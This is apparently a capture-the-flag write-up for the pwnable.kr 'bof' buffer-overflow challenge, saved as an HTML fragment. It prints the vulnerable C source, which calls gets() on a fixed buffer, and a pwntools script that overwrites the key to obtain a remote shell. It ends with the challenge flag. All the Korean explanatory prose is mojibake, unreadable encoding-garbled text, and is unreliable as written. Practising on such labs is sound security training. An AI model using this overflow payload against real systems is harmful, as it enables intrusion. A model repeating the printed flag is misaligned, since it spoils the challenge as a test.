I"È<p><br />
ë¬¸ì œëŠ” <a href="http://pwnable.kr/play.php">pwnable.kr</a>ì—ì„œ ë°›ìœ¼ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<hr />

<p><br /></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!</span>
  <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
  <span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>keyê°€ 0xcafebabeì´ë©´ ì‰˜ì„ ì‹¤í–‰ì‹œì¼œì¤€ë‹¤.<br />
ì…ë ¥ì€ overflowme ë³€ìˆ˜ì— ë°›ê¸° ë•Œë¬¸ì— keyì™€ overflowmeì˜ ê±°ë¦¬ë¥¼ ì•Œë©´<br />
bofë¥¼ í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.<br />
gdbë¡œ ì‹¤í–‰ì‹œì¼œë³´ì.<br /></p>

<p><img src="/assets/img.png" alt="img1" /></p>

<p>ë‘ë²ˆì§¸ í•¨ìˆ˜ ì½œì€ gets í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì´ë‹¤.
<br /><br />ì—¬ê¸°ì— overflowmeê°€ ì¸ìë¡œ ë“¤ì–´ê°€ë‹ˆê¹Œ 
<br /><strong>overflowmeëŠ” ebp - 0x2c</strong> ì— ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.
<br /><br />ê·¸ ì•„ë˜ì— ebp+0x8 ìœ„ì¹˜ì™€ 0xcafebabeë¥¼ ë¹„êµí•˜ë‹ˆê¹Œ 
<br /><strong>keyëŠ” ebp + 0x8</strong> ì— ìœ„ì¹˜í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
<br /><br />bofë¥¼ ìœ„í•´ ì±„ì›Œì¤˜ì•¼ í•˜ëŠ” ë¬¸ìì˜ ìˆ˜ëŠ” <strong>0x2c + 0x8 = 0x34(52)</strong> ì´ë‹¤.
<br />ì´ì œ í˜ì´ë¡œë“œë¥¼ ì§œê³  ì‹¤í–‰ì‹œì¼œë³´ì.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span><span class="s">'9000'</span><span class="p">)</span>
<span class="c1">#p = process('./bof')
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">52</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">'</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p><img src="/assets/img2.png" alt="img2" />
ì„±ê³µì ìœ¼ë¡œ ì‰˜ì„ íšë“í–ˆë‹¤.
<br />
FLAG : daddy, I just pwned a buFFer :)</p>
:ET